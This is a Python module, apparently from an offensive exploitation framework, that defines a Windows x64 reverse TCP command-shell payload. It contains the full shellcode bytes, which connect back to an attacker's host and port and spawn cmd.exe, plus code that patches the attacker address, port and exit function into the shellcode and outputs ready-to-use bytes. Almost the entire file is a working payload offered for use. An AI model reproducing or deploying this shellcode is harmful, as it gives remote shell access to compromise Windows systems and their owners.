import socket
import struct
from collections.abc import Mapping, Sequence

from libs.arch import ARCH_X64
from libs.platform import PLATFORM_WINDOWS
from libs.text import Text
from terasploit.module.payload import (
    SINGLE,
    Payload,
    PayloadHandler,
)


class TerasploitModule(Payload):
    """Windows x64 Command Shell, Reverse TCP Inline."""

    NAME: str = "Windows x64 Command Shell, Reverse TCP Inline."
    DESCRIPTION: str = "Connect back to attacker and spawn a command shell (Windows x64)"
    AUTHOR: Sequence = ["sf", "4steroth"]
    LICENSE: str = "BSD-3-CLAUSE"
    VERSION: str = "1.1"
    RANK: str = "normal"
    REFERENCES: Sequence = [
        "modules/payloads/singles/windows/shell_reverse_tcp.rb",
    ]
    PAYLOAD_TYPE: str = SINGLE
    HANDLER: object = PayloadHandler.ReverseTCP
    CACHED_SIZE: int = 460
    MAX_SIZE: int | None = 512
    ARCH: Sequence = [ARCH_X64]
    PLATFORM: Sequence = [PLATFORM_WINDOWS]
    # This bytearray is replaceable without changing anything in the methods below
    # Just make sure to add the correct offsets.
    PAYLOAD: Mapping = {
        "Offsets": {"LPORT": [232, "!H"], "LHOST": [234, socket.inet_aton], "EXITFUNC": [422, "<I"]},
        "Payload": bytearray(
            b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51"
            b"\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52"
            b"\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0"
            b"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed"
            b"\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88"
            b"\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44"
            b"\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
            b"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1"
            b"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44"
            b"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49"
            b"\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a"
            b"\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
            b"\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32"
            b"\x5f\x33\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
            b"\x00\x49\x89\xe5\x49\xbc\x02\x00\x11\x5c\x7f\x00\x00\x01\x41\x54"
            b"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89"
            b"\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x50"
            b"\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0"
            b"\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10"
            b"\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5"
            b"\x48\x81\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
            b"\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0\x6a\x0d"
            b"\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01\x48\x8d\x44\x24"
            b"\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41\x50\x41\x50\x41\x50\x49"
            b"\xff\xc0\x41\x50\x49\xff\xc8\x4d\x89\xc1\x4c\x89\xc1\x41\xba\x79"
            b"\xcc\x3f\x86\xff\xd5\x48\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08"
            b"\x87\x1d\x60\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d"
            b"\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
            b"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5"
        ),
    }
    OPTIONS: Sequence[str] = ["LHOST", "LPORT", "EXITFUNC"]

    def write_field(self, payload, offset, data, expected_size):
        """Write fixed-width encoded data into a bytearray."""
        if not isinstance(payload, bytearray):
            raise TypeError("payload must be a bytearray")
        if len(data) != expected_size:
            raise ValueError(f"Expected {expected_size} bytes, received {len(data)}")
        if offset < 0 or offset + expected_size > len(payload):
            raise ValueError("Field offset is outside the payload")

        payload[offset : offset + expected_size] = data
        return payload

    def pack_payload_contents(self, lhost, lport, exitfunc):
        """Pack payload contents."""
        # Pack local host and local port
        encoded_lhost = self.PAYLOAD["Offsets"]["LHOST"][1](lhost)
        encoded_lport = struct.pack(self.PAYLOAD["Offsets"]["LPORT"][1], int(lport))

        # Pack exit function
        exitfunc = struct.pack(self.PAYLOAD["Offsets"]["EXITFUNC"][1], Text.ror13_hash(exitfunc))

        return encoded_lhost, encoded_lport, exitfunc

    def generate(self, ctx) -> bytes | str:
        """Generate single windows x64 payload."""
        lhost, lport, exitfunc = self.pack_payload_contents(
            ctx.get_option("LHOST"),
            ctx.get_option("LPORT"),
            ctx.get_option("EXITFUNC"),
        )

        payload = self.PAYLOAD["Payload"]
        self.write_field(
            payload,
            self.PAYLOAD["Offsets"]["LHOST"][0],
            lhost,
            len(lhost),
        )
        self.write_field(
            payload,
            self.PAYLOAD["Offsets"]["LPORT"][0],
            lport,
            len(lport),
        )
        self.write_field(
            payload,
            self.PAYLOAD["Offsets"]["EXITFUNC"][0],
            exitfunc,
            len(exitfunc),
        )

        return bytes(payload)
